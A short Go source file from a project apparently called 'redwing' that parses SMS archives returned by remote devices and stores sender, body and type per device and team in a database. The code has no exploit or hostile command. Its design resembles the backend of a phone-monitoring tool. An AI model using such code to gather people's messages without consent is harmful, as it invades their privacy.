package ws

import (
	"encoding/json"

	"redwing/internal/db"
)

func parseSMSArchiveResult(deviceID, teamID string, resultData []byte) {
	var result any
	if json.Unmarshal(resultData, &result) != nil {
		return
	}

	var smsList []map[string]any

	switch v := result.(type) {
	case []any:
		for _, item := range v {
			if m, ok := item.(map[string]any); ok {
				smsList = append(smsList, m)
			}
		}
	case map[string]any:
		for _, key := range []string{"messages", "sms", "sms_list", "data"} {
			if msgs, ok := v[key].([]any); ok {
				for _, item := range msgs {
					if m, ok := item.(map[string]any); ok {
						smsList = append(smsList, m)
					}
				}
				break
			}
		}
	}

	for _, sms := range smsList {
		sender := strField(sms, "from", "sender", "address", "number")
		body := strField(sms, "body", "text", "message", "content")
		if body == "" {
			continue
		}
		if sender == "" {
			sender = "Unknown"
		}
		smsType := strField(sms, "type")
		if smsType == "" {
			smsType = "incoming"
		}

		var exists int
		db.DB.QueryRow(
			"SELECT COUNT(*) FROM sms WHERE device_id = ? AND team_id = ? AND sender = ? AND body = ?",
			deviceID, teamID, sender, body,
		).Scan(&exists)
		if exists > 0 {
			continue
		}

		db.DB.Exec(
			"INSERT INTO sms (device_id, team_id, sender, body, sms_type) VALUES (?, ?, ?, ?, ?)",
			deviceID, teamID, sender, body, smsType,
		)
	}
}

func strField(m map[string]any, keys ...string) string {
	for _, k := range keys {
		if v, ok := m[k].(string); ok && v != "" {
			return v
		}
	}
	return ""
}
